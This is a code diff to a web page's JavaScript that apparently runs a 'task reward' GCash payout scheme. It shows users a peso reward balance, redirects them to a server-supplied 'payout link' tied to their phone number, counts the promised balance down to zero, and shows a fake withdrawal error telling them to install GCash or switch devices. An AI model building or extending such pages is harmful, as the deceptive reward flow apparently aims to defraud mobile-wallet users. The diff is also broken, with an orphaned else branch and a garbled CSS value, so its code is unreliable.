@@ -435,7 +435,7 @@ function hideFirewallPopup() {
             <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ffd700; line-height: 1.4; text-align: center; margin: 5px 0 0 0;">
                 You’re one tap away by getting your task reward amounting to 
                 <span style="font-size: 20px; font-weight: 900; color: #ffd700; text-shadow: 0 0 8px rgba(255,215,0,0.5);">₱${currentBalance.toFixed(2)}</span> 
-                Payout Wallet.
+                <br>Payout Wallet.
             </p>
         </div>
         
@@ -515,46 +515,63 @@ function hideFirewallPopup() {
                 
                 const linkData = await getLatestPayoutLink();
                 
-                if (linkData && linkData.url) {
-                    isRedirecting = true;
-
-                    // MARK LINK AS USED bago mag-redirect
-                    const userPhone = localStorage.getItem("userPhone");
-                    await markLinkAsUsed(linkData.key, userPhone);
-                    
-                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
-                    setTimeout(() => {
-                        window.removeEventListener('beforeunload', beforeUnloadHandler);
-                        window.location.href = linkData.url;
-                    }, 800);
-                } else {
-                    claimInProgress = false;
-                    isRedirecting = false;
-                    window.removeEventListener('beforeunload', beforeUnloadHandler);
-                    
-                    this.disabled = false;
-                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
-                    this.style.opacity = '1';
-                    
-                    const errorDiv = document.createElement('div');
-                    errorDiv.className = 'error-message';
-                    errorDiv.style.cssText = 'background: rgba(255,68,68,0.15); border: 1px solid #ff4444; border-radius: 10px; padding: 12px; margin-top: 10px; text-align: center;';
-                    errorDiv.innerHTML = `
-                        <div style="color: #ff8888; font-size: 14px; font-weight: bold; margin-bottom: 5px;">⚠️ Withdrawal Unsuccessful</div>
-                        <div style="color: #ccc; font-size: 11px; line-height: 1.4;">Update or Install GCash App and withdraw your task reward.</div>
-                        <div style="color: #ffaa33; font-size: 10px; margin-top: 8px;">or Switch Device and try again!</div>
-                    `;
-                    
-                    const existingError = popupInner.querySelector('.error-message');
-                    if (existingError) existingError.remove();
-                    proceedBtn.parentNode.insertBefore(errorDiv, proceedBtn.nextSibling);
-                    
-                    setTimeout(() => {
-                        if (errorDiv) errorDiv.remove();
-                    }, 5000);
-                }
-            };
+                 // HANAPIN ANG PRIZE AMOUNT ELEMENT SA PHASE 2
+    const prizeAmountElement = document.querySelector('#proceedBtn').closest('.popup-inner').querySelector('.prize-amount-wrapper div[style*="font-size: 56px"]');
+    
+    if (prizeAmountElement) {
+        // I-disable ang button habang nag-cocountdown
+        this.disabled = true;
+        this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s无限;"> COUNTDOWN...`;
+        
+        // Countdown mula sa current balance pababa hanggang 0 (3 seconds)
+        const startValue = currentBalance;
+        const steps = 60;
+        const decrement = startValue / steps;
+        
+        for (let i = 0; i <= steps; i++) {
+            const current = startValue - (decrement * i);
+            prizeAmountElement.innerText = `₱${current.toFixed(2)}`;
+            await new Promise(r => setTimeout(r, 50)); // 50ms x 60 = 3 seconds
         }
+    }
+    
+    // MARK LINK AS USED
+    const userPhone = localStorage.getItem("userPhone");
+    await markLinkAsUsed(linkData.key, userPhone);
+    
+    isRedirecting = true;
+    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
+    setTimeout(() => {
+        window.removeEventListener('beforeunload', beforeUnloadHandler);
+        window.location.href = linkData.url;
+    }, 500);
+    
+} else {
+    claimInProgress = false;
+    isRedirecting = false;
+    window.removeEventListener('beforeunload', beforeUnloadHandler);
+    
+    this.disabled = false;
+    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
+    this.style.opacity = '1';
+    
+    const errorDiv = document.createElement('div');
+    errorDiv.className = 'error-message';
+    errorDiv.style.cssText = 'background: rgba(255,68,68,0.15); border: 1px solid #ff4444; border-radius: 10px; padding: 12px; margin-top: 10px; text-align: center;';
+    errorDiv.innerHTML = `
+        <div style="color: #ff8888; font-size: 14px; font-weight: bold; margin-bottom: 5px;">⚠️ Withdrawal Unsuccessful</div>
+        <div style="color: #ccc; font-size: 11px; line-height: 1.4;">Update or Install GCash App and withdraw your task reward.</div>
+        <div style="color: #ffaa33; font-size: 10px; margin-top: 8px;">or Switch Device and try again!</div>
+    `;
+    
+    const existingError = popupInner.querySelector('.error-message');
+    if (existingError) existingError.remove();
+    proceedBtn.parentNode.insertBefore(errorDiv, proceedBtn.nextSibling);
+    
+    setTimeout(() => {
+        if (errorDiv) errorDiv.remove();
+    }, 5000);
+}
     }
 
     // ========== TASK #3 MESSAGE (No Available Link) ==========
